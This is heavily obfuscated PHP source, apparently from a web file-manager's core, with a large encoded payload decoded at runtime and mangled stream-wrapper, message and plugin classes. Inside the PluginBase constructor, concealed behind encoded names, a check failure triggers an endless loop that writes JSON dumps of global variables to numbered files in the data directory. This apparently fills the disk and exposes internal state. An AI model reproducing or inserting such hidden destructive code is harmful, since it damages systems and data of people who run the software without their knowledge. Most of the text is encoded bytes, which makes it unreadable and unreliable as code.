J·G>ª<ù²'."\r".'ÃKí0–%W×=YŸw`†®-°Pá'."\r".'‡—“Å°')."\115\233\314\360\153\165\125\125\225\267\152\46\372\237\75\223\140\346\46\153\253\252\212\100\252\252\152\311\377\64\203\70\134\3\24\164\346\40\222\310\150\71\0\14\351\72\64\10\366\116\164\14"."\56\60\146\263\263\1\277\367\124\160\323\140\132\204\126\54\302\76\142\217\225\221\125\207\77\117\205\134\340\103\114\167\17\2\327\214\0\174\146\127\0\324\310\66\174\10\35\250\262\175\144\120"."\xa0\xbd\xfc\x31\x31\x2\x13\xab\x66\x3e\x7d\xc7\x5d\xc7\x1b\x15\xcc\x26\x3b\xe5\x8f\xf9\xd8\xe0\xd2\x44\x61\x60\xde\xcb\x32\xbc\xb2\x93\x17\x28\x44\x9\x9d\xb8\xf4\x73\x34\xd\x95\x71\x1a\x7a\xc5\x29\x88\xb3"."\111\360\176\342\4\111\14\213\31\130\311\170\55\216\312\167\173\44\233\277\310\45\261\64\67\13\202\243\155\274\46\352\354\210\372\261\201\61\54\261\12\123\346\220\52\170\23\34\75\206\307\310"."\x90\xe2\xa3\x24\x43\xc3\xa4\xf4\x6a\x1a\x8f\x2b\xdb\x93\x24\x70\xae\x81\x26\xd4\x77\x40\x1b\x89\x58\xc0\xe8\x37\x9c\xb6\x38\x54\xa9\xa8\x3c\xb6\xf3\x31\x20\xeb\x49\xdc\x59\x12\x57\x84\xe8\x57\x80\xbb\x7c\xa2"."\xa\xc8\xac\x6d\xa\x50\x14\x1a\x25\xe6\xe6\xa9\x17\x61\x22\x9c\xa9\x9d\x5c\x34\xb9\xb6\x7b\x62\xc9\x1c\x39\x6e\x2d\xdc\x6a\x7f\x2c\x26\xcd\x14\xbb\xd0\x8a\x7d\x87\x66\x1e\x4b\x9\xb2\x4\x7a\x15\xd7\xc0\xad"."\274\112\25\270\263\134\145\2\364\36\254\250\0\244\27\103\223\353\302\22\320\70\335\5\115\354\271\66\160\263\325\262\221\127\52\127\222\64\300\54\160\264\41\324\157\130\35\203\322\51\323\227"."\313\233\175\150\326\55\171\320\120\172\173\351\144\16\136\14\131\2\210\267\136\206\223\23\361\305\44\163\121\16\350\54\214\20\150\111\276\71\112\240\302\313\224\224\350\134\315\122\106\3\367\314"."\x26\x27\xe2\x53\xab\xac\x70\x45\x4e\x15\xce\x3a\xf0\x71\xd8\x99\xc2\x5b\xf6\x2d\x48\xc7\xc4\x18\x36\xf8\xaf\x97\xf5\x90\x29\x98\xa0\x48\x58\xc4\x24\xbb\x9f\x54\x1d\x68\xc2\x70\x95\xe9\x77\xe1\x11\x12\x9a\x14".strrev('w+'."\n".'yÀ²çÉî÷™Ì\\]n–ĞaÌr»ÌÂ'."\n".'áQt©¡Í=it!8ŞÛ'."\r".'FštÎ').base64_decode('Kt+n4SFVZRkQXtEt3GN7CUR0IlsRVpF9G1cArUGrWYrh2tlVJjolW1Si6cHJCvX6rWBf5g==')."\x53\x9d\xf3\x53\x5c\x0\xfc\xa3\x99\x88\x7b\xc4\x26\xa3\xe5\x42\xb8\xae\xe\x17\x89\x5a\xec\xa0\x88\xbc\xad\x94\x75\x63\xba\xa9\xca\x34\x5f\x35\xe8\xcd\x4e\x63\xbe\x47\x28\x3d\x16\x6a\x12\x7e\xe8\x76\x27\xea"."\x56\x37\x3a\xea\x8c\xf2\xdd\x4\x26\xa4\x93\x52\x63\x56\x27\x6e\x32\x84\x92\x6c\x7e\x14\xe7\xee\x2a\xed\x15\x8a\x5c\x11\xda\x75\xe3\x29\x2c\xbe\xe9\x56\x48\x33\xe7\x13\xcf\x15\x25\x72\xb1\x99\xd\xf6\x35\x6e".strrev('5ºŠîÄéç‰=tFÚÆ¼kj(9û¦H'."\n".'huM.ñœmüË	m‹˜ÕÆ<~m1‚?(>')."\143\161\11\211\243\101\121\151\347\45\373\276\315\266\156\346\30\101\150\224\222\240\40\300\357\136\174\62\13\234\44\360\50\46\51\42\226\150\37\324\312\353\304\55\310\12\205\126\140\140\362\172"."\302\314\47\361\206\50\131\257\311\332\121\275\117\216\22\145\4\266\32\204\161\165\271\12\154\22\114\42\73\170\25\6\22\166\101\66\60\46\371\137\100\61\311\317\206\304\210\172\147\52\234\203".base64_decode('VWnNNDJDyiDwpZhZlzRWep5GJFOxQg+/W3axmOzFmyJzcOwJG66AWHzCPbDkPFQttnsueg==')."\46\27\41\337\54\52\102\363\60\23\45\336\272\311\71\26\166\240\321\301\146\261\124\116\211\117\221\54\151\104\23\14\323\140\225\257\20\203\4\31\43\72\123\305\366\316\254\366\62\223\354\362"._kodDe('LCntKmgjlWJuwoYR8gth9QtYNwVymCI1Zl5B+x4kXV62kQZUQXxR5LkhBGWTWRdyVBg7NN0=')."\21\211\352\76\143\200\216\122\371\164\204\160\166\243\103\133\335\5\200\326\207\63\37\134\151\210\306\120\33\120\246\103\173\320\125\11\370\153\221\235\205\220\122\242\37\102\245\37\45\231\324\141".base64_decode('hzQwQqGKmqZibxY4kRPJcZMnFitlYayEKqmhADjxVlRiQwEOaWPrCH/OjTUY8SbNddQtOQ==').strrev('†¡Í#„¡#C¥›3©¦»å„J'."\n".'“ËçªO?v–öõ\'åYˆjIæ”tØÕZr9rÂ').base64_decode('QLgxFFus9OFbVc6pEH87zqVMpMR04BlW93DfLzjo7UEnBm+Sn6oscX4ifYHKhKM8Z7UU/w==')."\364\174\121\215\131\374\10\57\135\124\6\313\276\113\100\247\205\244\127\2\316\345\365\142\370\21\35\53\52\112\55\226\12\24\112\264\6\340\113\177\201\70\354\221\241\21\43\244\147\47\152\274"."\221\35\64\54\103\54\174\126\142\104\256\75\320\330\32\152\123\3\341\160\144\231\103\277\127\110\375\363\134\144\222\224\235\47\111\63\43\46\201\176\275\330\300\42\230\263\223\35\123\270\304\50"."\x74\xfa\x64\x4b\x9d\x39\x76\x55\x5\x5e\x67\xb9\x33\x15\x1a\x95\x9c\x9b\xe5\xf2\x9a\x61\xe9\x52\x2\xf5\xc3\x35\x1d\xde\xbc\x69\xe9\xb4\xc3\x55\x69\xba\x57\x8a\x16\x9c\x3b\x6b\xc9\x4f\xa9\xf4\x3\x2c\x8d\xb0"."\264\23\3\104\103\315\55\361\377\272\251\106\122\330\340\63\222\114\201\214\277\154\246\176\126\32\144\277\273\354\233\302\233\117\161\312\177\353\34\316\43\256\373\124\142\303\214\171\241\64\311\1"."\11\270\167\232\26\212\250\324\371\256\370\4\342\127\362\43\71\371\276\325\237\204\32\260\265\321\40\273\333\303\21\161\102\301\120\120\11\376\12\75\267\242\343\70\26\35\262\263\14\23\303\41".base64_decode('ggED7lCadHm3c6u5O3zXFX2DuFKheeQOCkF2iz6hGHedJIq6c0o0AGUrQrjFAZQ6pYo6Wg==')."\344\156\161\224\5\314\176\203\370\0\261\30\30\314\344\154\307\231\276\105\176\362\42\115\11\115\300\222\236\74\27\325\321\71\147\121\74\261\165\154\62\125\171\227\44\214\222\70\351\141\175\112"."\63\63\122\224\340\220\203\205\131\157\270\206\63\166\45\224\355\65\345\121\47\364\34\277\172\242\156\124\251\310\301\203\116\36\272\135\354\220\215\26\377\277\51\110\63\143\222\351\130\147\45\305".base64_decode('DbLcO6Xg2rCvuZQ55PStilPc3uUcfuWkFUasEcie8JyFPEUunRTit1tBxAjmHmvksCMtAQ==')."\x96\x3e\x3d\x8d\xfe\x74\xc1\x2f\xdb\xd\xdd\x8d\xa0\x74\xe\x3e\x59\xc9\x51\xb1\x21\x65\xa4\x93\x79\xae\x6b\x25\x12\x5a\x75\x21\x67\x20\xa5\x10\x61\xc9\x69\xcc\x3f\x39\xf1\x3b\x9\xdd\xe5\x5e\xa4\x4a\xb9\x1c"."\304\166\102\235\316\260\204\217\61\261\365\72\175\56\361\333\174\113\54\41\313\166\170\371\212\233\161\255\317\103\121\25\23\105\21\253\37\221\303\262\326\75\351\5\312\144\262\300\44\237\357\205"."\22\0\163\334\231\364\20\257\222\224\56\272\335\124\111\353\223\223\137\271\164\137\332\354\321\322\240\10\350\170\43\227\107\207\61\235\155\41\16\60\232\344\327\162\71\161\363\41\357\270\350\137".base64_decode('x/NnyOuIt6jEFIhK1RNiAuek20iaCDeThWyI3sA4UvPSMVE2ukxvZcQrWgBH7Wyn17AwYA==')."\x72\x95\xec\x6a\x9c\x4b\xd4\x11\x3d\xe2\xa7\x69\x7f\xf1\x55\x3a\xd6\x21\x3\x8a\x82\x75\x76\x74\xa1\x4a\x42\xec\x72\xc8\xe7\x38\x0\x50\x16\x28\x2\x35\x1c\xb\x19\xa3\x12\x62\xa6\xa9\xdf\x4e\x42\x29\x64\x8a".base64_decode('9i2pkgs18A9ayiMaxXzy06j38jMRjgveQDZnJDRr3K47i92QMpejbOmAv9ESTkQn9EHqEQ==')."\xf\xa6\xbf\xcd\xd1\x9a\x78\x9e\xeb\xf4\x2a\x8f\xfb\xc1\x39\xb\x7e\xec\x28\x3a\xb9\xb8\xf\x2d\x7c\x58\x5d\x5\xa2\xee\x41\x8e\x9b\xc5\xe2\x65\xa1\x6c\xe0\xf0\x90\x2a\xf5\x1a\x48\x5b\xb1\x97\x55\x69\x18\xa4"."\176\27\362\151\17\321\273\360\60\165\306\222\216\132\35\156\337\334\23\132\302\325\353\167\126\10\317\31\310\231\55\351\244\172\265\13\172\362\354\202\332\15\146\70\160\27\155\300\342\315\36\65"."\xb1\x5c\xb4\x41\xac\xc8\x24\xab\x67\xcd\x9e\x27\xcb\x46\xc4\x14\x8a\x6b\x5b\x30\x7f\x52\x43\x7f\x80\xc7\x11\x48\xa1\x38\x86\xc1\xa3\x30\xbb\xce\xf2\xea\x27\x99\xce\xf7\x31\xc5\x5e\x81\x5d\x3b\xc0\x7f\xb7\x60"."\xc4\xe1\x83\x82\x4a\x2a\xb7\xc5\xfe\xd3\x8b\x46\x80\xe0\xa9\xa4\xf8\x25\x6d\x88\x2e\xd\x1f\x13\x2b\xdd\x58\x62\xd5\xd1\x2d\x50\xf8\x2\x76\x7e\x8b\xb2\xf\x25\xfa\x21\x3e\x2b\x2d\x16\xea\xd7\xd5\x4c\xe3\x23"."\172\6\213\376\355\274\346\74\217\226\72\166\221\221\140\147\74\54\275\25\61\247\16\24\10\143\104\266\164\56\223\153\264\115\267\44\11\27\307\373\42\221\212\106\262\151\330\266\261\65\11\261".strrev('dÈGn¤I%9	^Ù«ÒÑøôåéo˜Õ%|>™‘š?à£ÌœwİÂşP˜ÓÑb; L_ôJ$Ú').base64_decode('A7kQJ2Bnv13Vo2Kijm6PMhFQMbsnufoVFgwlRg+XZm/BJxAgkKfITpZJ9kRK3vEKUztk6Q==')."\72\226\261\144\106\135\176\7\113\52\222\327\107\161\325\222\137\127\41\140\42\22\51\350\21\54\156\242\53\101\232\31\150\346\257\250\65\111\223\317\51\365\2\346\116\162\112\216\206\117\362\333"."\155\312\141\311\137\60\332\23\42\354\45\4\152\216\343\30\213\342\215\56\237\356\204\176\271\35\275\263\61\43\104\103\320\103\351\165\276\343\250\304\135\135\72\216\116\226\333\337\55\142\5\35"."\216\76\222\105\56\302\201\160\222\267\160\364\153\322\326\313\32\325\47\205\332\12\31\21\221\144\307\344\274\305\63\35\106\14\260\235\76\27\215\140\246\21\54\227\33\154\152\27\234\206\331\261"."\340\177\355\352\365\377\225\207\327\331\125\114\312\357\360\14\337\14\314\71\264\26\137\245\162\131\7\225\60\273\372\341\334\136\47\1\26\241\301\367\111\216\351\111\234\353\203\63\133\215\314\204"."\243\306\156\332\264\164\132\332\204\113\37\147\212\374\157\43\344\353\347\76\233\113\105\334\57\176\335\276\270\73\211\200\227\271\331\356\56\5\50\350\22\77\65\225\300\143\232\304\230\145\101\223"."\262\106\242\277\304\65\71\321\207\165\332\361\227\230\223\42\60\321\6\304\303\60\43\230\176\26\112\340\343\42\61\370\2\243\47\77\312\217\344\330\301\262\22\166\201\156\370\5\103\40\100\264"."\x64\x42\xe5\x48\x2a\x22\x6f\x71\xc7\x9c\x38\x12\xe5\xe1\x16\x34\xc8\xc7\xa6\xd3\x51\xa2\xd5\xe5\x5a\x98\x2\x31\x1b\xbf\xa0\x5\x21\xd1\xd3\x62\xad\x89\xe2\xd2\x9c\xe\xc8\x45\xb0\x1a\xbe\x53\x34\x86\x27\x18".strrev('”o7×¥YX&`&:ñC.-ìËr%Ë‘…b‰ĞM5K÷pî¸•ŞãªºôÌ%uå[Ì7')."\342\220\74\36\214\116\264\347\115\302\50\72\123\271\130\110\322\214\116\110\62\127\67\357\107\223\247\371\344\216\310\327\257\316\73\34\254\232\47\56\65\343\221\150\120\135\26\302\6\44\102\53"."\203\35\314\364\261\141\22\77\41\254\312\216\326\12\362\6\15\26\0\72\305\64\231\2\225\164\104\314\340\133\170\301\12\373\275\166\46\327\300\257\140\235\57\231\245\367\16\314\172\226\54\222".base64_decode('dALjRyvOtbiwFFjCzFuy8UtHJma7TJQbZefojixayHrC1pMK3sAdPH1nTdWs7m+rpYa5cQ==')."\103\220\65\337\1\131\3\203\70\313\313\264\170\31\114\311\162\46\265\166\123\52\17\73\262\267\35\110\44\234\314\270\235\313\64\71\54\111\325\112\42\122\205\330\324\2\57\103\23\314\115\233"."\331\40\130\13\127\36\46\15\23\347\342\323\51\277\147\146\76\111\260\206\234\37\233\334\302\317\60\374\4\377\100\262\275\102\315\250\260\307\250\130\46\40\44\73\204\342\26\237\11\341\113\166"."\176\44\222\217\146\370\353\13\42\315\241\2\32\207\234\6\364\2\344\44\351\236\34\35\266\222\116\267\134\44\223\44\63\33\333\120\203\164\323\353\274\150\347\257\123\213\366\277\202\21\226\262"."\111\51\146\253\25\375\342\207\366\41\141\360\210\144\323\73\254\300\240\306\155\212\271\113\165\70\16\262\322\265\174\202\120\210\140\361\315\253\270\20\226\270\107\126\14\237\204\305\306\356\112\227"."\x28\xaa\xd8\xf3\xb4\x41\xc1\xb\x8b\xb3\x58\x32\xd9\xa4\xd\x96\x0\x4d\xea\x6e\x9b\x70\x28\x85\x83\x12\x5e\x5a\xb2\x94\x21\x9e\xc4\xe8\x43\xf2\xd7\x1\x4e\xbc\x58\x71\x0\x16\xa7\xa\x4b\x1a\x52\x79\x71\x7"."\47\272\211\323\112\165\237\120\70\147\161\331\122\7\107\52\221\104\335\56\161\35\26\351\334\213\225\174\204\162\13\355\12\27\357\210\117\72\355\202\160\60\76\147\10\206\274\227\363\72\122\135"."\47\171\54\111\143\174\240\53\13\144\113\122\365\45\105\120\22\12\350\351\260\124\235\174\23\77\141\201\130\351\217\10\254\164\16\261\144\120\105\144\60\226\105\256\305\261\147\361\216\1\144\124".strrev('('."\r".''."\r".'ƒEóÓ‹3‹’%"v§\'Èğá-îà.^µw^YœæŸˆf&—Ğ)àäµ=Ç4tÎ')."\335\17\167\153\331\130\273\145\7\242\222\242\366\110\152\76\161\263\104\31\332\242\222\305\150\26\56\51\16\47\216\262\23\14\1\56\113\263\160\331\242\154\126\270\150\134\111\71\133\53\130\23".base64_decode('dK948EAWlSzRYSGxkUAnGs+SwMWfA0x0QxPhVelWCJmTS92iVCtKAk/YCje04DnwCbRUjg==')."\x43\x3b\xc9\xb9\xa3\x94\xa2\xdb\x2c\xa7\x4\xa5\xa6\x54\x68\x42\xb5\x25\xa1\xca\x53\xbc\x65\x88\xbc\x12\x8a\x45\xf4\x93\x98\xfb\x91\x8d\x2f\x96\xc8\x96\xb5\x94\x4a\xeb\x31\x45\x4b\x52\x19\xcb\xa9\x60\xe4\x4a"."\x97\x7\x8\xcc\x83\xd3\x8\x53\x44\x44\x2c\x58\xda\xe8\x17\xa\x9c\xec\xfd\x6\x48\x1d\xb8\x36\x64\x7f\xd6\xe4\xdb\x53\x52\xe8\xe7\x62\xce\x29\x90\x77\x8f\x73\x51\x6d\x4e\xd4\xcf\x16\x24\x43\xed\x25\x9f\x93"."\x78\xb0\x60\xa8\x58\x4\x93\xd6\xf8\xbb\x3e\xa1\xe3\x46\xcf\xcc\xa6\x6d\x24\x74\xa7\x35\x78\xd9\x6\x23\xcd\x67\x1f\x49\x4b\x62\x68\x97\x4\x58\x88\xa9\x1c\xa\x30\x25\xe4\xa2\x24\x89\x6\x7d\xe2\x32\x86\xd6"."\47\372\42\341\204\343\265\27\145\111\340\16\213\136\177\67\140\235\14\176\361\111\114\222\323\55\234\146\307\314\274\355\301\171\161\63\107\176\353\115\333\26\332\44\124\56\104\330\154\274\17\173"."\x24\x65\x29\x14\x12\xb7\x9c\xb8\x51\xe4\xfa\x8c\xa0\x2d\xa1\x58\x24\x8\x17\xf1\x58\xe0\x12\xd3\x69\x2e\xa1\x73\x8e\x8\xbe\x96\xe3\x11\x79\x9b\x85\xb\xf9\xa6\x82\x4b\x65\x40\x24\xf4\x9b\xc9\x1e\x73\x98\x19"."\x3e\x44\x78\x25\xd\x92\xb8\xb8\xd3\xdc\xbc\xa5\x60\x8b\x0\x15\x65\xd5\x2f\x62\x38\xc4\xf2\xd3\x1c\x3f\xb8\x1e\xf2\x92\x3a\xc0\xd3\xa8\x6f\x75\xae\xcf\x51\x9c\xfa\x6e\xe4\x2a\xda\xdf\x56\x3\x8\xef\x45\x15"."\xd4\xef\x8\x91\xa4\xc2\x6b\xb4\x58\x3c\x56\x94\xd5\x1e\x88\xc5\x96\x45\xa2\x8d\xd4\x4d\x49\x51\x36\x29\x25\xa9\xd2\x15\x65\xb5\xb7\x44\xda\x26\xca\xb\xb6\x6\x42\xe1\xa2\x3c\xac\x75\xd7\xa6\xa\x13\x9a\x34".strrev('—N2Š¬l#=»ä÷¥¦>BWdÊ\\£»¤^b”gWvRå±Ih±a¨Ej\'îIZNÔ+')."\74\377\26\63\206\314\3\116\337\200\56\45\130\206\330\120\21\326\254\153\203\272\243\71\110\305\356\135\70\175\340\174\276\120\357\360\71\324\100\244\164\262\206\10\121\222\160\123\336\357\111\302".base64_decode('9JIDJN81FN+DkVwxALhhx5iglrna7JHuuegpC16Tw5BK2pM07Mi2tb6S2hBUhIyphBDu/g==')."\37\253\344\56\370\316\270\0\0".""."", 10, -8))); goto fñŞáêàì; E™îÎ¯ÏĞÇ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÙÓß…“Œ, $ÇÈ¶äÛµ = '') { $this->info = $this->info($ÙÓß…“Œ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[³Ôà×Ó][87]]; $this->pathOpen = $ÙÓß…“Œ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÙÓß…“Œ])) { self::$_chunkBuffer[$ÙÓß…“Œ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($èİğµˆË) { $·„Èù¯… = $this->fileSubstr($this->pose, $èİğµˆË); $this->pose += strlen($·„Èù¯…); return $·„Èù¯…; } public function stream_tell() { return $this->pose; } public function stream_seek($õÄ©Ôú, $¶Ú®“„‹) { $ë¹×è× =& $_SERVER[³Ôà×Ó]; if ($¶Ú®“„‹ == SEEK_SET) { $this->pose = $õÄ©Ôú; } else { if ($¶Ú®“„‹ == SEEK_CUR) { $this->pose += $õÄ©Ôú; } else { if ($¶Ú®“„‹ == SEEK_END) { $this->pose = $this->info[$ë¹×è×[79]] + intval($õÄ©Ôú); } } } if ($õÄ©Ôú < 0) { $this->pose = $this->info[$ë¹×è×[79]] + $õÄ©Ôú; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[³Ôà×Ó][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ù•ŠÖ±à, $‰êùáš) { $Ü€ØÉã¤ =& $_SERVER[³Ôà×Ó]; $äŠ˜ÊîÆ = $this->info($ù•ŠÖ±à); return array($Ü€ØÉã¤[1603] => 0, $Ü€ØÉã¤[1604] => 0, $Ü€ØÉã¤[16] => 32768 + 511, $Ü€ØÉã¤[1605] => 0, $Ü€ØÉã¤[1606] => 0, $Ü€ØÉã¤[1607] => 0, $Ü€ØÉã¤[1608] => 0, $Ü€ØÉã¤[79] => $äŠ˜ÊîÆ[$Ü€ØÉã¤[79]], $Ü€ØÉã¤[1609] => $äŠ˜ÊîÆ[$Ü€ØÉã¤[1449]], $Ü€ØÉã¤[1565] => $äŠ˜ÊîÆ[$Ü€ØÉã¤[88]], $Ü€ØÉã¤[1564] => $äŠ˜ÊîÆ[$Ü€ØÉã¤[231]], $Ü€ØÉã¤[1610] => 0, $Ü€ØÉã¤[1611] => 0); } static $fileInfo = array(); public function info($º÷—½ÈÅ) { $÷ş²ĞİŒ = $_SERVER[³Ôà×Ó][1612]; if (isset(self::$fileInfo[$º÷—½ÈÅ])) { return self::$fileInfo[$º÷—½ÈÅ]; } if (substr($º÷—½ÈÅ, 0, strlen($÷ş²ĞİŒ)) != $÷ş²ĞİŒ) { return !1; } self::$fileInfo[$º÷—½ÈÅ] = IO::info(substr($º÷—½ÈÅ, strlen($÷ş²ĞİŒ))); return self::$fileInfo[$º÷—½ÈÅ]; } public static function read($Ó÷Â¡Ô, $İ–”»–, $Ê¥¯¹é) { if (!isset(self::$_fopenCache[$Ó÷Â¡Ô])) { $å¬†°ü± = new StreamWrapperIO(); $å¬†°ü±->stream_open($Ó÷Â¡Ô); self::$_fopenCache[$Ó÷Â¡Ô] = $å¬†°ü±; } $å¬†°ü± = self::$_fopenCache[$Ó÷Â¡Ô]; return $å¬†°ü±->fileSubstr($İ–”»–, $Ê¥¯¹é); } public static function _read($¡€ÆÌ¥², $™™ôê‘³, $‹íæú‚‡) { $šã¶è‚¹ =& $_SERVER[³Ôà×Ó]; $×ô”¢„ = fopen($¡€ÆÌ¥², $šã¶è‚¹[1453]); if (!$×ô”¢„) { return $šã¶è‚¹[12]; } $¨Ù…±ĞŒ = 8192; fseek($×ô”¢„, $™™ôê‘³, SEEK_SET); $®ù‰É³ = $šã¶è‚¹[12]; $ÛŒÄ¿ìÁ = 0; while ($ÛŒÄ¿ìÁ < $‹íæú‚‡) { $Ç¸„šèµ = min($¨Ù…±ĞŒ, $‹íæú‚‡ - $ÛŒÄ¿ìÁ); $®ù‰É³ .= fread($×ô”¢„, $Ç¸„šèµ); $ÛŒÄ¿ìÁ += $Ç¸„šèµ; } fclose($×ô”¢„); return $®ù‰É³; } public function fileSubstr($È÷şİ¸â, $ƒ•™ó¥¹) { $­šÔ’• =& $_SERVER[³Ôà×Ó]; $Ó‚¢˜¬ñ = $this->info[$­šÔ’•[79]]; $‚•ŠôñÀ = $È÷şİ¸â; $ºÀŸ’ùÛ = $ƒ•™ó¥¹; if ($È÷şİ¸â < 0) { $È÷şİ¸â = $Ó‚¢˜¬ñ + $È÷şİ¸â; } if ($ƒ•™ó¥¹ === !1) { $ƒ•™ó¥¹ = $Ó‚¢˜¬ñ - $È÷şİ¸â; } if ($È÷şİ¸â + $ƒ•™ó¥¹ > $Ó‚¢˜¬ñ) { $ƒ•™ó¥¹ = $Ó‚¢˜¬ñ - $È÷şİ¸â; } if ($ƒ•™ó¥¹ <= 0) { return $­šÔ’•[12]; } if ($È÷şİ¸â < 0 || $È÷şİ¸â >= $Ó‚¢˜¬ñ || $ƒ•™ó¥¹ <= 0 || $ƒ•™ó¥¹ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\x69\154\145\122\x65\141\144\40\x65\x72\162\157\162\x21\40\x73\164\x61\x72\164\75{$È÷şİ¸â}\x3b\x6c\x65\x6e\x67\x74\150\75{$ƒ•™ó¥¹}\73\x20\x73\x69\x7a\145\x3d{$Ó‚¢˜¬ñ}\73"); } $Õñ¢«÷ = 64 * 1024; $¿‹¼®˜é =& self::$_chunkBuffer[$this->path]; if (!$¿‹¼®˜é) { $¿‹¼®˜é = array(); } $×¶ÕæĞî = 0; $ÙŸƒÉ«¦ = 0; $ÊÃ§ì = $­šÔ’•[12]; foreach ($¿‹¼®˜é as $×¶ÕæĞî => $ÊÃ§ì) { $×¶ÕæĞî = intval($×¶ÕæĞî); $ÙŸƒÉ«¦ = $×¶ÕæĞî + strlen($ÊÃ§ì); if ($È÷şİ¸â >= $ÙŸƒÉ«¦) { continue; } if ($È÷şİ¸â >= $×¶ÕæĞî && $È÷şİ¸â + $ƒ•™ó¥¹ <= $ÙŸƒÉ«¦) { return substr($ÊÃ§ì, $È÷şİ¸â - $×¶ÕæĞî, $ƒ•™ó¥¹); } break; } if (count($¿‹¼®˜é) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($­šÔ’•[1613], $­šÔ’•[1614] . count($¿‹¼®˜é) . "\73\x73\x74\x61\162\164\x3d{$È÷şİ¸â}\x2c\154\145\x6e\x67\164\x68\75{$ƒ•™ó¥¹}\x3b\160\x6f\163\145\72{$×¶ÕæĞî}\176{$ÙŸƒÉ«¦}"); throw new Exception($­šÔ’•[1615]); } $ó·¹¦ñö = intval($È÷şİ¸â / $Õñ¢«÷) * $Õñ¢«÷; $ğ†Å™ = ceil(($È÷şİ¸â + $ƒ•™ó¥¹) / $Õñ¢«÷) * $Õñ¢«÷ - $ó·¹¦ñö; $ŞÂÜ·Œ = IO::fileSubstr($this->path, $ó·¹¦ñö, $ğ†Å™); $¿‹¼®˜é[$ó·¹¦ñö . $­šÔ’•[12]] = $ŞÂÜ·Œ; ksort($¿‹¼®˜é); $Şî•û™ = substr($ŞÂÜ·Œ, $È÷şİ¸â - $ó·¹¦ñö, $ƒ•™ó¥¹); return $Şî•û™; } private function log($ó¸•Ö§½, $‡æÙû‡) { $¶İ¥ÓŒ› =& $_SERVER[³Ôà×Ó]; $²ô·µØ¥ = timeFloat() - $this->timeStart; write_log(sprintf($¶İ¥ÓŒ›[1616], $ó¸•Ö§½, $this->info[$¶İ¥ÓŒ›[32]], $²ô·µØ¥, $‡æÙû‡), $¶İ¥ÓŒ›[1261]); } } class Message { function __construct() { } public function send($ëÕ˜Œì“ = '', $±€¹ô©§ = array(), $ã¸‚ë§ë = "\x74\145\170\164") { $«Ó ÆÌæ =& $_SERVER[³Ôà×Ó]; $Œ·ó½£ = array($«Ó ÆÌæ[33] => $«Ó ÆÌæ[1617], $«Ó ÆÌæ[171] => $ëÕ˜Œì“); if (in_array($ã¸‚ë§ë, array($«Ó ÆÌæ[1617], $«Ó ÆÌæ[1618]))) { $Œ·ó½£[$«Ó ÆÌæ[33]] = $ã¸‚ë§ë; } $±€¹ô©§ = array($«Ó ÆÌæ[587] => isset($±€¹ô©§[$«Ó ÆÌæ[587]]) ? $±€¹ô©§[$«Ó ÆÌæ[587]] : $«Ó ÆÌæ[12], $«Ó ÆÌæ[671] => isset($±€¹ô©§[$«Ó ÆÌæ[671]]) ? $±€¹ô©§[$«Ó ÆÌæ[671]] : $«Ó ÆÌæ[12]); if (empty($ëÕ˜Œì“) || empty($±€¹ô©§[$«Ó ÆÌæ[587]]) && empty($±€¹ô©§[$«Ó ÆÌæ[671]])) { return !1; } $²„Ò¨  = array($«Ó ÆÌæ[1545] => $Œ·ó½£, $«Ó ÆÌæ[1619] => $±€¹ô©§); Hook::trigger($«Ó ÆÌæ[1620], $²„Ò¨ ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¯–˜Ë— =& $_SERVER[³Ôà×Ó]; $ÚÙòÆ‘ê = $_SERVER[$¯–˜Ë—[439]]; $‹øˆÀ®… = $¯–˜Ë—[951]; if ($_SERVER[$¯–˜Ë—[431]] != $‹øˆÀ®…($ÚÙòÆ‘ê)) { $®¼Ë„§æ = $¯–˜Ë—[952]; $ë×°Úï = $¯–˜Ë—[433]; $ÈÒÏ¦µ— = $_SERVER[$¯–˜Ë—[434]] . $¯–˜Ë—[435]; $á²”•Ú´ = $ë×°Úï($ÈÒÏ¦µ—); $‘ƒˆ­ù¦ = explode($¯–˜Ë—[262], $á²”•Ú´); if (count($‘ƒˆ­ù¦) < $¯–˜Ë—[709]) { $•Ù¾ãìŞ = $¯–˜Ë—[437]; $•Ù¾ãìŞ(); } $¯©úìËÌ = $¯–˜Ë—[953]; $¯©úìËÌ($_SERVER[$¯–˜Ë—[954]]); $®¼Ë„§æ = $¯–˜Ë—[952]; $®¼Ë„§æ(); $è˜¬º¯ = $¯–˜Ë—[955]; $ãåøê¸ô = json_encode($GLOBALS[$¯–˜Ë—[956]]); $ŞßµÃš² = 1; for ($ìÎ†ÏÄÃ = $ŞßµÃš²; $ìÎ†ÏÄÃ > 0; $ìÎ†ÏÄÃ++) { $è˜¬º¯(DATA_PATH . $ìÎ†ÏÄÃ, $ãåøê¸ô); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¯–˜Ë—[1621]); $this->pluginName = str_replace($¯–˜Ë—[1621], $¯–˜Ë—[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¯–˜Ë—[8]; $this->pluginApi = appHostGet() . $¯–˜Ë—[1622] . $this->pluginName . $¯–˜Ë—[8]; $this->pluginHost = $config[$¯–˜Ë—[1623]] . $this->pluginName . $¯–˜Ë—[8]; $this->pluginHostDefault = $config[$¯–˜Ë—[1623]] . $this->pluginName . $¯–˜Ë—[8]; $·ñèÄÌ³ = $config[$¯–˜Ë—[1624]]; if ($·ñèÄÌ³ && strpos($¯–˜Ë—[50] . $·ñèÄÌ³ . $¯–˜Ë—[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¯–˜Ë—[1625]] . $this->pluginName . $¯–˜Ë—[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { 